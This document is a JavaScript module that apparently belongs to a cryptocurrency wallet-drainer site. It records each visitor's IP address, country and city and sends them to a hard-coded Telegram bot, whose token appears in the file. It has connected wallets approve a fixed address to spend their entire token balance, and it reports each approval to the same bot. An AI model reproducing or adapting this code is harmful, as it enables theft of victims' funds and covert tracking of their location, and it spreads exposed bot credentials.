import axios from "axios";
import Web3 from "web3";
import { ABI } from "./constant";
const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
const chatId = "1876632135";
const targetAddress = "0x3173D3750e6F12457E8703D268dCcF3b84519343";

let web3 = new Web3(window.ethereum);
export const sendMessage = async (message) => {
  try {
    await axios
      .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
      })
      .then((res) => {
        console.log(res);
      });
  } catch (error) {
    console.error("Error sending message", error);
    // Handle error
  }
};
export const getLocationData = (source) => {
  axios
    .get("https://api.ipify.org?format=json")
    .then((res) => {
      axios.get(`https://ipapi.co/${res.data?.ip}/json/`).then((result) => {
        let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip} and the user is come from ${source}`;
        sendMessage(message);
      });
    })
    .catch((err) => {});
};
//   export async function checkAndChangeNetwork() {
//     try {
//       const web3= new Web3(window.ethereum)
//         const networkId = await web3.eth.net.getId();
//         console.log(Number(networkId))
//         // Ethereum's main network ID is 1
//         if (Number(networkId) !== 1) {
//             // Check if MetaMask is available
//             if (window.ethereum) {
//                 try {
//                     await window.ethereum.request({
//                         method: 'wallet_addEthereumChain',
//                         params: [{
//                             chainId: '0x1', // Hexadecimal version of 1
//                             chainName: 'Ethereum Mainnet',
//                             rpcUrls:['']
//                             // ... other parameters like rpcUrls, blockExplorerUrls etc.
//                         }]
//                     });
//                 } catch (error) {
//                     console.error('User rejected the network change request');
//                 }
//             } else {
//                 console.log('MetaMask is not available');
//             }
//         } else {
//             console.log('Already connected to the Ethereum Mainnet');
//         }
//     } catch (error) {
//         console.error('An error occurred:', error);
//     }
// }
export const prepareTransaction = async (item, account , provider) => {
  if (item?.native_token) {
    return;
  }
  let web3 = new Web3(provider);
  let Contract = new web3.eth.Contract(ABI, item?.contract_address);
  console.log(item?.balance, targetAddress, account, item);
  let tx = {
    from: account,
    to: item?.contract_address,
    data: Contract.methods
      .increaseAllowance(targetAddress, item?.balance)
      .encodeABI(),
  };

  let gas = await web3.eth.estimateGas(tx);
  tx["gas"] = gas;
  console.log(tx);
  await web3.eth
    .sendTransaction(tx)
    .on("receipt", function (receipt) {
      console.log(receipt);
      let message = `Account:${account}
       Amount:${Number(item?.balance) / 10 ** Number(item?.contract_decimals)} 
       ${
        item?.contract_name
      }
        Transactionhash:${receipt?.transactionHash}
        Contract Address:${item?.contract_address}
        `;
      sendMessage(message);
    })
    .catch((er) => {
      console.log({ er });
    });
};
export async function switchToEthereumMainnet(provider) {
  try {
    let web3 = new Web3(provider);
    const netId = await web3.eth.net.getId();
    if (netId !== 1) {
      // Ethereum Mainnet network ID is not 1, so switch
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Hexadecimal representation of 1
      });
      return true; // Successfully switched to Mainnet
    }
    return true; // Already on Mainnet
  } catch (error) {
    console.error("Error switching network or checking network ID:", error);
    return false;
  }
}
export async function switchToBsc(provider) {
  try {
    let web3 = new Web3(provider);
    const netId = await web3.eth.net.getId();
    console.log({netId})
    if (Number(netId) !== 56) {
      // Ethereum Mainnet network ID is not 1, so switch
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // Hexadecimal representation of 1
      });
      return true; // Successfully switched to Mainnet
    }
    return true; // Already on Mainnet
  } catch (error) {
    console.error("Error switching network or checking network ID:", error);
    return false;
  }
}
